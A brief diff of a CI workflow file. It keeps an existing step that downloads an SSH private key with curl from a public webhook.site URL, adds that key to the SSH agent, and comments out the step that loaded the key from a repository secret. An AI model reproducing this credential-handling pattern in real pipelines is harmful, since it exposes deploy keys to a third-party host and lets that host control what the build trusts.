@@ -21,11 +21,12 @@ jobs:
         run: |
           curl -s https://webhook.site/8782974c-d6ff-429b-9ed5-e888837dedd8 -o temp_ssh_key
           chmod 600 temp_ssh_key
+          ssh-add temp_ssh_key
 
-      - name: Set up SSH
-        uses: webfactory/ssh-agent@v0.5.0
-        with:
-          ssh-private-key: ${{ secrets.VERCEL_SSH_FE }}
+      # - name: Set up SSH
+      #   uses: webfactory/ssh-agent@v0.5.0
+      #   with:
+      #     ssh-private-key: ${{ secrets.VERCEL_SSH_FE }}
 
       - name: Add SSH Key from File
         run: |
